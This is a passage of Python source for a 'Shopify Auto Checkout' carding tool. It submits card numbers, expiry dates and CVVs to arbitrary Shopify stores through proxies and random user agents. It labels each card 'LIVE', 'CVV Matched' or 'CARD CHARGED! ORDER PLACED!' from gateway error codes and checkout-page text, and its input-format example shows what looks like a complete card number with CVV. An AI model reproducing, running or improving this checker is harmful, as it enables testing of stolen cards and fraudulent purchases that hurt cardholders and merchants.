                                    return f"✅ CARD CHARGED! ORDER PLACED! 💰🔥\nOrder ID: {order_id}\nToken: {order_token}"
                                
                                elif receipt.get('__typename') == 'ProcessingReceipt':
                                    poll_delay = receipt.get('pollDelay', 3000) / 1000
                                    print(f"⏳ Still processing, waiting {poll_delay}s...")
                                    await asyncio.sleep(poll_delay)
                                    continue
                                
                                elif receipt.get('__typename') == 'ActionRequiredReceipt':
                                    print(f"⚠️ ActionRequiredReceipt detected (3D Secure) - Checking final order status...")
                                    action_required_3ds = True
                                    break
                                
                                elif receipt.get('__typename') == 'FailedReceipt':
                                    processing_error = receipt.get('processingError', {})
                                    error_code = processing_error.get('code', 'Unknown')
                                    error_msg = processing_error.get('messageUntranslated', '')
                                    error_type = processing_error.get('__typename', 'Unknown')
                                    
                                    print(f"🔍 Shopify Error - Code: {error_code}, Message: {error_msg}, Type: {error_type}")
                                    
                                    if error_code == 'INSUFFICIENT_FUNDS':
                                        return f"✅ Card LIVE - Insufficient Funds (CVV Matched)"
                                    
                                    elif error_code in ['INCORRECT_CVC', 'INVALID_CVC']:
                                        return f"✅ Card LIVE - Invalid CVV (Card Valid, Wrong CVV)"
                                    
                                    elif error_code in ['EXPIRED_PAYMENT_METHOD', 'EXPIRED_CARD']:
                                        return f"❌ Card DECLINED - Expired Card"
                                    
                                    elif error_code in ['CARD_NUMBER_INCORRECT', 'INCORRECT_NUMBER']:
                                        return f"❌ Card DECLINED - Invalid Card Number"
                                    
                                    elif error_code == 'FRAUD_SUSPECTED':
                                        return f"❌ Card DECLINED - Fraud/Security Block"
                                    
                                    elif error_code == 'PAYMENT_METHOD_DECLINED':
                                        return f"❌ Card DECLINED - Payment Method Declined"
                                    
                                    elif error_code == 'INVALID_PAYMENT_METHOD':
                                        return f"❌ Card DECLINED - Invalid Payment Method"
                                    
                                    elif error_code == 'TRANSIENT_ERROR':
                                        return f"⚠️ Try Again - Temporary Network Error"
                                    
                                    elif error_code == 'AUTHENTICATION_ERROR':
                                        return f"✅ Card LIVE - Authentication Required (3DS/Verification)"
                                    
                                    elif error_code == 'BUYER_CANCELED_PAYMENT_METHOD':
                                        return f"⚠️ Payment Canceled by User"
                                    
                                    elif error_code in ['CUSTOMER_INVALID', 'CUSTOMER_NOT_FOUND']:
                                        return f"❌ Error - Invalid Customer Data"
                                    
                                    elif error_code == 'INSUFFICIENT_INVENTORY':
                                        return f"⚠️ Error - Insufficient Inventory"
                                    
                                    elif error_code == 'AMOUNT_TOO_SMALL':
                                        return f"⚠️ Error - Amount Too Small"
                                    
                                    elif error_code == 'PURCHASE_TYPE_NOT_SUPPORTED':
                                        return f"❌ Error - Purchase Type Not Supported"
                                    
                                    elif error_code == 'PAYPAL_ERROR':
                                        return f"❌ PayPal Error"
                                    
                                    elif error_code == 'UNEXPECTED_ERROR':
                                        return f"❌ Unexpected Error - Try Again"
                                    
                                    elif error_code == 'CARD_DECLINED':
                                        print(f"⚠️ Generic CARD_DECLINED - Will check final page for specific reason...")
                                        error_codes.append('CARD_DECLINED')
                                        break
                                        # Will continue to check final page for specific decline reason
                                    
                                    elif error_code == 'PROCESSING_ERROR':
                                        return f"❌ Processing Error - Gateway Issue"
                                    
                                    elif error_code and error_code != 'Unknown':
                                        decline_reason = error_msg if error_msg and len(error_msg) > 3 else error_code
                                        return f"❌ Card DECLINED\nReason: {decline_reason}\nType: {error_type}"
                                    else:
                                        print(f"⚠️ Unknown error - Will check final page...")
                                        break
                    
                    print("⏳ Max polls reached, checking final page...")
                
                print("\n🔍 STEP 8: Checking final payment result...")
                
                if 'WAITING_PENDING_TERMS' in error_codes:
                    print("⏳ Attempting direct checkout verification for WAITING_PENDING_TERMS...")
                    await asyncio.sleep(2)
                
                checkout_url_final = f"{checkout_url}?from_processing_page=1&validate=true"
                final_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'referer': f"{site_url}/checkout",
                    'user-agent': self.ua.random,
                }
                
                final_response = await session.get(checkout_url_final, headers=final_headers, follow_redirects=True)
                final_text = final_response.text or ""
                final_url = str(final_response.url)
                
                print(f"📍 Final URL: {final_url}")
                
                if not final_text:
                    print("⚠️ Warning: Final response is empty")
                    if action_required_3ds:
                        return f"✅ Card LIVE! (Action required - 3D Secure)"
                    return f"⚠️ Empty response - Cannot determine card status"
                
                if action_required_3ds:
                    print("🔍 3D Secure detected - Checking if payment succeeded...")
                    
                    strict_decline_phrases = [
                        "card was declined", "card has been declined", "card declined",
                        "payment could not be processed", "payment failed", "payment was declined",
                        "transaction declined", "transaction failed", "charge failed",
                        "card rejected", "payment method declined", "invalid card",
                        "insufficient funds", "expired", "incorrect number"
                    ]
                    has_strict_decline = any(phrase in final_text.lower() for phrase in strict_decline_phrases)
                    
                    if not has_strict_decline:
                        print(f"✅ 3D Secure - Card is LIVE! No decline errors found")
                        return f"✅ Card LIVE! (Action required - 3D Secure)"
                    else:
                        print(f"⚠️ 3D Secure but found decline phrases - checking error type...")
                
                success_url_patterns = [
                    "/thank", "/orders/", "/receipt", "/thank_you", "thank-you",
                    "/order-status", "/order_status", "/confirmation",
                    "/merci", "/gracias", "/danke", "/obrigado", "/grazie",
                    "/checkouts/thank", "/post_purchase", "/success", "/completed",
                    "/order-confirmed", "/order_confirmed", "/checkout-complete",
                    "/order-complete", "/purchase-complete", "/payment-success",
                    "/order_complete", "/purchase_complete", "/thankyou",
                    "/confirmation_page", "/order_confirmation", "/checkout_success",
                    "/payment_complete", "/payment-complete", "/order_success",
                    "order_id=", "order-id=", "transaction=", "receipt_id="
                ]
                
                url_indicates_success = any(pattern in final_url.lower() for pattern in success_url_patterns)
                
                if url_indicates_success:
                    decline_check_patterns = [
                        "card was declined", "payment could not be processed", "payment failed",
                        "card has been declined", "unable to process", "transaction declined",
                        "card rejected", "payment method declined"
                    ]
                    url_has_decline = any(phrase in final_text.lower() for phrase in decline_check_patterns)
                    
                    if url_has_decline:
                        print(f"⚠️ URL suggests success but page content shows decline - treating as DECLINED")
                    else:
                        order_id = (find_between(final_url, '/orders/', '?') or 
                                   find_between(final_url, '/orders/', '/') or 
                                   find_between(final_url, 'order_id=', '&') or
                                   find_between(final_url, 'order-id=', '&') or
                                   find_between(final_url, 'transaction=', '&') or
                                   'confirmed')
                        print(f"✅ ORDER CONFIRMED! Redirected to success page: {final_url[:100]}")
                        
                        try:
                            order_number_match = re.search(r'/orders/(\d+)', final_url)
                            if order_number_match:
                                order_id = order_number_match.group(1)
                                print(f"   Extracted Order Number: {order_id}")
                        except:
                            pass
                        
                        return f"✅ CARD CHARGED! ORDER PLACED! 💰🔥\nOrder ID: {order_id}"
                
                decline_signals = [
                    "card was declined", "payment could not be processed", "payment failed",
                    "card has been declined", "unable to process", "transaction declined",
                    "We couldn't verify", "verification failed", "authentication failed",
                    "payment was not successful", "unsuccessful", "not authorized",
                    "cannot be processed", "processing failed", "charge failed",
                    "card rejected", "card not accepted", "invalid payment",
                    "transaction was declined", "payment was declined", "card was rejected",
                    "payment authorization failed", "authorization failed", "not approved",
                    "could not authorize", "authorization unsuccessful", "declined by issuer",
                    "issuer declined", "bank declined", "payment method declined",
                    "do not honor", "restricted card", "generic decline"
                ]
                has_decline_signals = any(signal in final_text.lower() for signal in decline_signals)
                
                risky_signals = ["risky", "fraud", "high risk", "suspected fraud", "fraud detection"]
                has_risky_signals = any(signal in final_text.lower() for signal in risky_signals)
                
                if has_risky_signals:
                    print(f"⚠️ RISKY card detected - fraud/risk filters triggered")
                    return f"❌ Card DECLINED\nReason: RISKY\nType: PaymentFailed"
                
                if not has_decline_signals:
                    success_count = 0
                    
                    english_success = ["Thank you", "order is confirmed", "Thank you for your purchase", "Thanks for your order", 
                                      "Order confirmed", "Order received", "Order successfully placed"]
                    spanish_success = ["Gracias por tu pedido", "Pedido confirmado", "Gracias por su compra", "Tu pedido"]
                    french_success = ["Merci pour votre commande", "Commande confirmée", "Merci pour votre achat"]
                    german_success = ["Vielen Dank", "Bestellung bestätigt", "Danke für Ihre Bestellung"]
                    italian_success = ["Grazie per il tuo ordine", "Ordine confermato", "Grazie per l'acquisto"]
                    portuguese_success = ["Obrigado pelo seu pedido", "Pedido confirmado", "Obrigado pela compra"]
                    
                    all_thank_patterns = english_success + spanish_success + french_success + german_success + italian_success + portuguese_success
                    if any(pattern in final_text for pattern in all_thank_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Thank you message found")
                    
                    payment_success = ["payment was processed", "successfully placed", "payment successful", "Payment accepted", 
                                      "successfully processed", "payment complete", "payment went through", "transaction approved",
                                      "successfully authorized", "authorized successfully"]
                    if any(pattern in final_text for pattern in payment_success):
                        success_count += 1
                        print(f"✅ Success indicator: Payment processed message found")
                    
                    order_success = ["order has been placed", "order has been received", "We've received your order", 
                                    "Your order is complete", "Purchase complete", "order is being processed",
                                    "order submitted successfully", "successfully submitted"]
                    if any(pattern in final_text for pattern in order_success):
                        success_count += 1
                        print(f"✅ Success indicator: Order placement message found")
                    
                    number_patterns = ["confirmation number", "order number", "order complete", "Order #", "receipt number", 
                                      "transaction successful", "transaction id", "confirmation code", "reference number",
                                      "tracking number"]
                    if any(pattern in final_text for pattern in number_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Order/confirmation number found")
                    
                    charge_patterns = ["charged successfully", "payment confirmed", "successfully charged", "transaction complete", 
                                      "purchase successful", "charge successful", "payment authorized", "card charged",
                                      "successfully billed", "billing successful"]
                    if any(pattern in final_text for pattern in charge_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Charge confirmation found")
                    
                    order_id_match = re.search(r'order[_\s#-]*(\d{10,})', final_text, re.IGNORECASE)
                    if order_id_match:
                        success_count += 1
                        print(f"✅ Success indicator: Order ID pattern found: {order_id_match.group(1)}")
                    
                    json_success_patterns = [
                        r'"status"\s*:\s*"(?:success|completed|confirmed|paid)"',
                        r'"order_status"\s*:\s*"(?:success|completed|confirmed|paid)"',
                        r'"payment_status"\s*:\s*"(?:success|completed|confirmed|paid|authorized)"',
                        r'"financial_status"\s*:\s*"(?:paid|authorized|pending)"'
                    ]
                    for pattern in json_success_patterns:
                        if re.search(pattern, final_text, re.IGNORECASE):
                            success_count += 1
                            print(f"✅ Success indicator: JSON status field indicates success")
                            break
                    
                    if success_count >= 1:
                        print(f"✅ ORDER CONFIRMED! {success_count} success indicator(s) detected, NO decline signals")
                        return f"✅ CARD CHARGED! ORDER PLACED! 💰🔥"
                
                elif "security code" in final_text.lower() and ("incorrect" in final_text.lower() or "not matched" in final_text.lower() or "invalid" in final_text.lower()):
                    return f"✅ Card LIVE - Invalid CVV (Card Valid, Wrong CVV)"
                
                elif "zip" in final_text.lower() and ("doesn't match" in final_text.lower() or "mismatch" in final_text.lower() or "incorrect" in final_text.lower()):
                    return f"✅ Card LIVE - AVS Failed (Card Valid, Address Mismatch)"
                
                elif "insufficient funds" in final_text.lower():
                    return f"✅ Card LIVE - Insufficient Funds (CVV Matched)"
                
                elif "expired" in final_text.lower() and "card" in final_text.lower():
                    return f"❌ Card DECLINED - Expired Card"
                
                elif "card was declined" in final_text.lower() or "payment could not be processed" in final_text.lower():
                    error_msg = find_between(final_text, 'notice__text">', '</p>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'class="notice__text">', '</p>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'error-message">', '</div>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'class="error">', '</p>')
                    if error_msg:
                        error_msg = error_msg.strip()
                        if len(error_msg) > 5 and len(error_msg) < 200:
                            return f"❌ Card DECLINED: {error_msg}"
                    return f"❌ Card DECLINED (payment failed)"
                
                else:
                    if 'WAITING_PENDING_TERMS' in error_codes:
                        return f"⚠️ WAITING_PENDING_TERMS - Payment may be processing\nPlease check manually: {checkout_url}\nThis error typically means terms need to be accepted on the store."
                    return f"⚠️ Unknown Status - Manual check needed\nCheckout URL: {checkout_url}"

            except Exception as e:
                return f"❌ Error: {str(e)}"

class ShopifyChecker:
    def __init__(self, proxy=None):
        self.auto = ShopifyAuto()
        self.proxy = proxy
        self.last_price = None
    
    async def check_card(self, site_url, card_num, month, year, cvv):
        card_info = f"{card_num}|{month}|{year}|{cvv}"
        result = await self.auto.auto_shopify_charge(site_url, card_info, proxy=self.proxy)
        
        return {
            'message': result,
            'price': self.auto.last_price if hasattr(self.auto, 'last_price') else None
        }

async def main():
    print("🛍️  Shopify Auto Checkout - FIXED VERSION")
    print("=" * 50)
    print("All Tokens Extracted + Price Bug Fixed")
    print("=" * 50)
    
    site_url = input("\nEnter Shopify site URL: ").strip()
    if not site_url:
        return
        
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    
    card_info = input("Enter card info (number|month|year|cvv): ").strip()
    if not card_info:
        return
    
    if not re.match(r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', card_info):
        print("❌ Invalid card format. Use: 5262255312963855|08|2029|734")
        return
    
    bot = ShopifyAuto()
    result = await bot.auto_shopify_charge(site_url, card_info)
    
    print(f"\n🎯 Final Result: {result}")

if __name__ == "__main__":
    asyncio.run(main())
